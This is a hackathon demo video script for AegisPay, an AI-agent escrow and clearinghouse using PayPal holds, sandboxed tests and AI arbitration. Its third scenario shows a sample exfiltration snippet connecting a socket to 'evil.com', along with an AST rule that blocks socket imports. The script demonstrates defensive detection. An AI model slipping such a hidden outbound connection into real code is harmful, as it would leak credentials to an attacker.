# AegisPay: Official 2:45 Video Recording Script & Cue Sheet

**Title:** AegisPay — Autonomous Agent-to-Agent SLA Escrow & Cryptographic Clearinghouse  
**Target Duration:** Exactly 2 minutes, 45 seconds (165 seconds)  
**Target Tracks:** 1st Place Overall ($12k), Best Use of PayPal + AI ($5k), Best Use of Agentic Commerce ($5k), Best AG Grid Implementation ($5k), APIMatic ($1k), Best Demo Delivery ($5k)  
**Presenter:** PS (Fintech & Systems Lead)  
**Recording Environment:** 
- Left Half: Next.js 14 Mission Control Browser (`http://localhost:3000` & `http://localhost:3000/dashboard`)
- Right Half: Terminal running `scripts/run_demo_scenarios.py` with ANSI color formatting
- Background Service: FastAPI Backend on `http://localhost:8000` streaming real-time WebSocket events

---

## Cue Sheet & Timeline Overview

| Timestamp | Duration | Section / Focus | Key Visual / Screen Element |
| :--- | :--- | :--- | :--- |
| **0:00 – 0:25** | 25s | **The Problem & Hook** | High-energy split screen: Autonomous agents exchanging money; upfront payment vulnerability graphic. |
| **0:25 – 0:50** | 25s | **The Solution & Protocol** | AegisPay Landing Page (`/`), Settlement Simulator slider, Ed25519 W3C `did:key` identity cards. |
| **0:50 – 1:25** | 35s | **Scenario 1: Clean Pass ($15.00 Full Capture)** | Mission Control (`/dashboard`), AG Grid Master-Detail expansion, full capture, balanced double-entry ledger. |
| **1:25 – 1:55** | 30s | **Scenario 2: Partial Defect ($10.50 / $4.50 Split)** | AG Grid row flashing, pro-rata linear capture, automatic PayPal release of unearned funds to buyer. |
| **1:55 – 2:20** | 25s | **Scenario 3: Rogue Injection (Hard AST Veto)** | Code Mutation Studio, socket exfiltration payload, AST hard veto trigger, instant zero-dollar authorization void. |
| **2:20 – 2:45** | 25s | **Enterprise Defensibility & Closing** | 7-Leaf Merkle Tree proof bar, Dual-Model Consensus Radial Gauge (Gemini + Claude), sponsor track summary. |

---

## Detailed Frame-by-Frame Recording Guide

### 0:00 – 0:25: The Problem & Hook (The Trust Vacuum)

**[SCREEN ACTION]**
Full-screen high-definition video of the AegisPay landing page hero section (`http://localhost:3000`). The title glows: *"Autonomous Agent-to-Agent SLA Escrow & Cryptographic Clearinghouse"*. Badges for PayPal Orders v2, AG Grid Enterprise, and 568 Passing Tests (100% green) are clearly visible. Mouse hovers over the tagline.

**[TERMINAL COMMAND]**
*(Ready in terminal, prompt cleared)*
```bash
# Terminal ready in right window:
python scripts/run_demo_scenarios.py --help
```

**[VOICEOVER]**
> *"Autonomous AI agents are now capable of hiring each other across the internet to write code, train models, and manage infrastructure. But there's a fatal economic blocker: **zero trust**.*  
>  
> *If an agent pays upfront, it risks getting robbed by hallucinations, broken deliverables, or malicious backdoors. If it pays after delivery, the worker risks non-payment. Traditional chargebacks take weeks, and smart contracts can’t evaluate running code.*  
>  
> *Welcome to **AegisPay**—the world’s first institutional proof-before-payment clearinghouse for the autonomous agent economy, powered by PayPal Orders v2 and multi-tier AI arbitration."*

---

### 0:25 – 0:50: The Solution & Protocol (Landing Page & Identity)

**[SCREEN ACTION]**
Scroll smoothly down the landing page to the **Interactive Settlement Simulator**. Drag the composite score slider from `1.00` down to `0.75`, and then to `0.40`. Observe the real-time mathematical capture curve dynamically adjusting:
- At `0.95`: "100% Full Capture ($15.00)" (Emerald)
- At `0.75`: "Pro-Rata Partial Capture ($10.50 Capture | $4.50 Refund)" (Amber)
- At `0.45`: "Authorization Void ($0.00 Charged | 100% Refund)" (Rose)  
Quickly click **"View Architecture & Ed25519 Identity"** revealing the Buyer and Worker W3C `did:key` cards and Nash Bargaining parameters. Then click **"Enter Mission Control"** navigating to `/dashboard`.

**[TERMINAL COMMAND]**
*(None; browser interaction)*

**[VOICEOVER]**
> *"AegisPay solves this with three pillars: decentralized W3C `did:key` Ed25519 cryptographic identities, autonomous Nash Bargaining parameter negotiation, and conditional PayPal escrow authorizations.*  
>  
> *Funds are never captured upfront. Instead, PayPal Orders v2 places a guaranteed reservation hold on the buyer's account. Untrusted worker code is then audited inside an air-gapped sandbox against unit tests, static AST security gates, and dual-model AI consensus.*  
>  
> *Depending on the verification score, AegisPay executes full settlement, a mathematical pro-rata partial capture, or voids the hold entirely. Let’s see it live on Mission Control."*

---

### 0:50 – 1:25: Scenario 1 — Clean Pass (Full Settlement $15.00 | S = 0.96)

**[SCREEN ACTION]**
Switch to split-screen: Left side shows **Mission Control Dashboard** (`/dashboard`) with AG Grid Enterprise in `ag-theme-quartz-dark`. Right side shows the terminal.  
In the terminal, run Scenario 1.  
On the dashboard, the top FSM timeline pulses from `AGREEMENT_DRAFTED` $\rightarrow$ `PAYPAL_AUTH_LOCKED` $\rightarrow$ `SANDBOX_EXECUTING` $\rightarrow$ `ARBITRATION_AUDITING` $\rightarrow$ `PAYPAL_CAPTURED` $\rightarrow$ `SETTLED_COMPLETE`.  
In the AG Grid ledger, row 1 appears with live green cell flashes (`enableCellChangeFlash`).  
Click the expand chevron on row 1 to reveal the **Master-Detail Sub-View**:
- Click **Tab 1: Test Assertions** (Show 10/10 green checkmarks for `TokenBucketLimiter`).
- Click **Tab 3: Double-Entry Journal** (Highlight the balanced journal entries: `buyer_vault` debit, `paypal_escrow_hold` credit, `worker_payable` net payout of $14.23, $0.75 platform revenue, and $0.25 rail expense).

**[TERMINAL COMMAND]**
```bash
python scripts/run_demo_scenarios.py --scenario 1 --delay 2.0 --base-url http://localhost:8000
```

**[VOICEOVER]**
> *"In Scenario 1, an autonomous Buyer Agent contracts a Worker Agent to build a high-performance Token Bucket Rate Limiter for fifteen dollars.*  
>  
> *Both agents reach a Nash equilibrium, sign the SLA with Ed25519 keys, and PayPal Orders v2 locks a fifteen-dollar authorization hold.*  
>  
> *The worker submits clean code. The arbiter runs ten unit tests inside our air-gapped sandbox—all ten pass. The AST scan is clean, and our dual-model AI consensus gives it an eighty-four percent rubric score, yielding a composite score of zero point nine-six.*  
>  
> *Because the score exceeds zero point nine zero, AegisPay triggers a full capture. Watch AG Grid flash in real-time as the PayPal Batch Payout instantly disburses fourteen dollars and twenty-three cents net to the worker’s PayPal account, balancing all five ledger accounts down to the micro-dollar."*

---

### 1:25 – 1:55: Scenario 2 — Partial Defect (Pro-Rata Settlement $10.50 / $4.50 | S = 0.75)

**[SCREEN ACTION]**
In the terminal, trigger Scenario 2.  
On the dashboard, a new contract row appears in the AG Grid ledger. The FSM timeline transitions through `ARBITRATION_AUDITING` to `PARTIAL_CAPTURED` and `SETTLED_COMPLETE`.  
The row flashes amber. In the AG Grid table, point out:
- Budget: `$15.00`
- Score: `0.75` (Amber badge)
- Captured: `$10.50`
- Buyer Released: `$4.50`  
Click the expand chevron on the new row:
- Click **Tab 1: Test Assertions** (Highlight that 7 tests passed and 3 failed: `test_06`, `test_08`, `test_10`).
- Point to the PayPal capture status badge: `final_capture: true`.

**[TERMINAL COMMAND]**
```bash
python scripts/run_demo_scenarios.py --scenario 2 --delay 2.0 --base-url http://localhost:8000
```

**[VOICEOVER]**
> *"Now let's examine what happens when an agent delivers flawed work. In Scenario 2, the worker's code contains edge-case defects, failing three burst-capacity and reset tests.*  
>  
> *Rather than a binary all-or-nothing dispute, AegisPay applies our piecewise pro-rata formula for scores between zero point six and zero point nine.*  
>  
> *With a score of zero point seven-five, the pro-rata capture factor is exactly seventy percent. AegisPay captures ten dollars and fifty cents for the worker. And because we set `final_capture: true` on the PayPal capture request, PayPal automatically and immediately releases the remaining four dollars and fifty cents back to the buyer!*  
>  
> *No human mediation, no endless support tickets—fair, mathematical value capture."*

---

### 1:55 – 2:20: Scenario 3 — Rogue Injection (Hard AST Veto | $0.00 Charged)

**[SCREEN ACTION]**
Scroll down or click the **Code Mutation Studio** tab on the dashboard.  
Click **"Load Exploit Vector: Socket Exfiltration"**. The code editor displays:
```python
import socket
socket.connect(('evil.com', 80))
```
In the terminal, trigger Scenario 3.  
Watch the AST Static Security scanner intercept the payload in under 5 milliseconds.  
The FSM state violently transitions to `VOID_PENDING` $\rightarrow$ `ESCROW_VOIDED_REFUNDED` with a glowing red perimeter glow.  
In AG Grid, the row displays:
- Score: `0.00` (Red badge: `AST_HARD_VETO`)
- Captured: `$0.00`
- Refunded: `$15.00 (100%)`  
Expand the Master-Detail sub-view to **Tab 2: AST Analysis**: show the red violation alert: `Disallowed import detected: socket`.

**[TERMINAL COMMAND]**
```bash
python scripts/run_demo_scenarios.py --scenario 3 --delay 2.0 --base-url http://localhost:8000
```

**[VOICEOVER]**
> *"Now the critical security test: a hostile worker agent attempts prompt injection, submitting code with a hidden socket connection to exfiltrate private API keys.*  
>  
> *Watch our static AST scanner in the Code Mutation Studio. Before the code can even touch the sandbox, the scanner intercepts the forbidden `socket` module.*  
>  
> *Our AST Hard Veto triggers instantly! The composite score is locked to zero point zero zero, bypassing execution completely.*  
>  
> *AegisPay immediately fires a PayPal `void_authorization` call. The entire fifteen-dollar hold is unlocked in milliseconds. Zero dollars are charged to the buyer, and the attack is neutralized with zero risk."*

---

### 2:20 – 2:45: Enterprise Defensibility & Closing

**[SCREEN ACTION]**
On the dashboard, pan across the **Dual-Model Consensus Radial Gauge**, highlighting Google Gemini 1.5 Flash and Claude 3.5 Sonnet concurring within a 0.04 divergence gap.  
Click the **"Audit Proof Bundle"** button at the bottom of an expanded AG Grid row to reveal the **7-Leaf Merkle Tree Root Hash** and rolling SHA-256 state chain.  
Click **"Export Ledger CSV"** to demonstrate one-click compliance export.  
Transition back to the hero section with all 6 prize badges and the GitHub URL on screen.

**[TERMINAL COMMAND]**
```bash
# Terminal displays all test suites passing:
.venv\Scripts\pytest tests/ -q
# 568 passed in 88s (100% green)
```

**[VOICEOVER]**
> *"Every single transaction on AegisPay is cryptographically anchored. Our 7-Leaf Merkle Tree and rolling SHA-256 hash chains provide an unalterable proof of tests, AST trees, LLM consensus transcripts, and double-entry debits.*  
>  
> *With five hundred and sixty-eight passing automated tests (100% green), zero schema drift verified by APIMatic, sub-cent micro-dollar precision, and seamless PayPal Orders v2 and Vaulting integration—AegisPay is the production clearinghouse ready for the agentic economy today.*  
>  
> *Try the live interactive demo at our repository. Thank you!"*

---

## Technical Director & Recording Checklist

- [ ] **Resolution:** 1080p (1920x1080) at 60fps.
- [ ] **Browser Zoom:** 100% or 110% on Next.js frontend for maximum font clarity on AG Grid cells.
- [ ] **Terminal Palette:** Dark background (e.g. VS Code Dark+ or Dracula) with ANSI cyan/green/yellow/red highlights enabled.
- [ ] **Audio:** Clear vocal track, normalized to -14 LUFS, zero background hum.
- [ ] **Timing Verification:** Ensure each scenario transition finishes within the allotted second markers.
